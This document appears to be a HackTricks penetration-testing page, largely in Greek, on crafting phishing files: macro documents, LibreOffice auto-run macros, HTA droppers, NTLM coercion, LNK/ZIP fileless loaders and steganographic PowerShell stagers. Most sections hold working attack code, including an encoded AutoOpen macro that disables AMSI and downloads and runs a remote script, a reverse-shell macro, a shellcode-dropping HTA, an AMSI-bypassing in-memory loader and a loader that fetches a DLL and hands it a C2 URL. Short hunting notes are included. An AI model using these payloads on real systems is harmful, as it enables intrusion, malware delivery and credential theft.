# Phishing Αρχεία & Έγγραφα

{{#include ../../banners/hacktricks-training.md}}

## Έγγραφα Office

Microsoft Word εκτελεί επαλήθευση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επαλήθευση δεδομένων γίνεται με τη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομαστεί το αρχείο αλλάζοντας την επέκταση και να διατηρηθούν οι δυνατότητες εκτέλεσης macro.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros εξ ορισμού, αλλά ένα αρχείο DOCM που μετονομαστεί σε RTF θα χειριστείται από το Microsoft Word και θα είναι ικανό να εκτελέσει macros.\
Τα ίδια εσωτερικά στοιχεία και μηχανισμοί ισχύουν για όλο το λογισμικό της Microsoft Office Suite (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την παρακάτω εντολή για να ελέγξετε ποιες επεκτάσεις πρόκειται να εκτελεστούν από ορισμένα προγράμματα Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Εξωτερική Φόρτωση Εικόνας

Μετάβαση σε: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Είναι δυνατό να χρησιμοποιηθούν macros για να εκτελέσουν arbitrary code από το έγγραφο.

#### Autoload functions

The more common they are, the more probable the AV will detect them.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Αφαίρεση μεταδεδομένων χειροκίνητα

Μεταβείτε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα ανοίξει το Document Inspector. Κάντε κλικ στο **Inspect** και μετά στο **Remove All** δίπλα από τα **Document Properties and Personal Information**.

#### Doc Extension

Όταν τελειώσετε, επιλέξτε το dropdown **Save as type**, αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\\
Κάντε το αυτό επειδή **δεν μπορείτε να αποθηκεύσετε macros μέσα σε `.docx`** και υπάρχει ένα **στίγμα** **γύρω** την macro-enabled **`.docm`** επέκταση (π.χ. το εικονίδιο μικρογραφίας έχει ένα μεγάλο `!` και κάποιες web/email gateway τα μπλοκάρουν εντελώς). Επομένως, αυτή η **παλαιού τύπου `.doc` επέκταση είναι ο καλύτερος συμβιβασμός**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

Τα έγγραφα LibreOffice Writer μπορούν να ενσωματώσουν Basic macros και να τα εκτελέσουν αυτόματα όταν ανοίγει το αρχείο, δεσμεύοντας τη macro στο γεγονός **Open Document** (Tools → Customize → Events → Open Document → Macro…). Ένα απλό reverse shell macro φαίνεται ως:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Σημείωσε τα διπλά εισαγωγικά (`""`) μέσα στη συμβολοσειρά – το LibreOffice Basic τα χρησιμοποιεί για να αποφεύγει τα κυριολεκτικά εισαγωγικά, οπότε τα payloads που τελειώνουν με `...==""")` διατηρούν τόσο την εσωτερική εντολή όσο και το όρισμα του Shell ισορροπημένα.

Delivery tips:

- Αποθήκευσε ως `.odt` και σύνδεσε τη μακροεντολή στο συμβάν του εγγράφου ώστε να εκτελείται αμέσως κατά το άνοιγμα.
- Όταν στέλνεις email με `swaks`, χρησιμοποίησε `--attach @resume.odt` (το `@` είναι απαραίτητο ώστε να αποσταλούν τα bytes του αρχείου, όχι το string του ονόματος αρχείου, ως συνημμένο). Αυτό είναι κρίσιμο όταν καταχράζεσαι SMTP servers που αποδέχονται αυθαίρετους παραλήπτες `RCPT TO` χωρίς επικύρωση.

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **εγκατεστημένο** along with **Internet Explorer**, making **`mshta` εξαρτημένο από το IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός NTLM Authentication

Υπάρχουν διάφοροι τρόποι να **force NTLM authentication "remotely"**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που ο χρήστης θα ανοίξει (ακόμα και HTTP MitM?). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **trigger** μια **authentication** απλώς με το **άνοιγμα του φακέλου.**

**Δείτε αυτές τις ιδέες και περισσότερα στις ακόλουθες σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή την authentication αλλά και να **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Ιδιαίτερα αποτελεσματικές εκστρατείες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα παραπλανητικά έγγραφα (PDF/DOCX) και ένα κακόβουλο .lnk. Το κόλπο είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από έναν μοναδικό marker, και το .lnk τον εξάγει και τον τρέχει πλήρως στη μνήμη.

Τυπική ροή που υλοποιείται από τον .lnk PowerShell one-liner:

1) Εντοπίστε το αρχικό ZIP σε συνήθεις διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, και τον γονικό φάκελο του current working directory.  
2) Διαβάστε τα bytes του ZIP και βρείτε έναν hardcoded marker (π.χ., xFIQCV). Ό,τι βρίσκεται μετά τον marker είναι το ενσωματωμένο PowerShell payload.  
3) Αντιγράψτε το ZIP στο %ProgramData%, εξάγετε εκεί, και ανοίξτε το παραπλανητικό .docx για να φαίνεται νόμιμο.  
4) Παράκαμψη AMSI για τη τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Deobfuscate το επόμενο στάδιο (π.χ., αφαιρέστε όλους τους χαρακτήρες #) και εκτελέστε το στη μνήμη.

Παράδειγμα PowerShell skeleton για να εξάγει και να τρέξει το ενσωματωμένο στάδιο:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Σημειώσεις
- Η παράδοση συχνά καταχράται αξιόπιστα subdomains PaaS (π.χ., *.herokuapp.com) και μπορεί να φιλτράρει τα payloads (σερβίρει benign ZIPs βάσει IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc για να ελαχιστοποιήσει τα ίχνη στο δίσκο.

Persistence που χρησιμοποιείται στην ίδια αλυσίδα
- COM TypeLib hijacking του Microsoft Web Browser control έτσι ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή που το ενσωματώνει να επανεκκινεί το payload αυτόματα. Δείτε λεπτομέρειες και έτοιμες εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (π.χ., xFIQCV) προσκολλημένο στα δεδομένα του αρχείου.
- .lnk που απαριθμεί parent/user folders για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Μακροχρόνιες business threads που τελειώνουν με links που φιλοξενούνται σε trusted PaaS domains.

## Steganography-delimited payloads in images (PowerShell stager)

Πρόσφατες loader chains παραδίδουν έναν obfuscated JavaScript/VBS που αποκωδικοποιεί και εκτελεί έναν Base64 PowerShell stager. Αυτός ο stager κατεβάζει μια εικόνα (συχνά GIF) που περιέχει ένα Base64-encoded .NET DLL κρυμμένο ως απλό κείμενο ανάμεσα σε μοναδικούς start/end markers. Το script ψάχνει για αυτούς τους delimiters (παραδείγματα που έχουν παρατηρηθεί: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το μεταξύ-κειμένου, Base64-decodes το σε bytes, φορτώνει την assembly in-memory και επικαλεί μια γνωστή entry method με το C2 URL.

Workflow
- Στάδιο 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Στάδιο 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (π.χ., VAI) passing the C2 URL and options.
- Στάδιο 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). Δείτε περισσότερα για process hollowing και trusted utility proxy execution εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Σημειώσεις
- Αυτό είναι ATT&CK T1027.003 (steganography/marker-hiding). Τα markers διαφέρουν μεταξύ των καμπανιών.
- AMSI/ETW bypass και string deobfuscation εφαρμόζονται συνήθως πριν τη φόρτωση του assembly.
- Αναζήτηση απειλών: σαρώστε τα κατεβασμένα images για γνωστούς delimiters· εντοπίστε PowerShell που προσπελαύνει τα images και αμέσως αποκωδικοποιεί Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Σκελετική λογική (abstract):
- Διαβάζει το περιεχόμενο του ίδιου του αρχείου
- Εντοπίζει ένα Base64 blob ανάμεσα σε junk strings
- Αποκωδικοποιεί σε ASCII PowerShell
- Εκτελεί με `wscript.exe`/`cscript.exe` καλώντας `powershell.exe`

Σημάδια ανίχνευσης
- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` από προσωρινούς φακέλους χρήστη.

## Windows files to steal NTLM hashes

Δείτε τη σελίδα σχετικά με **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
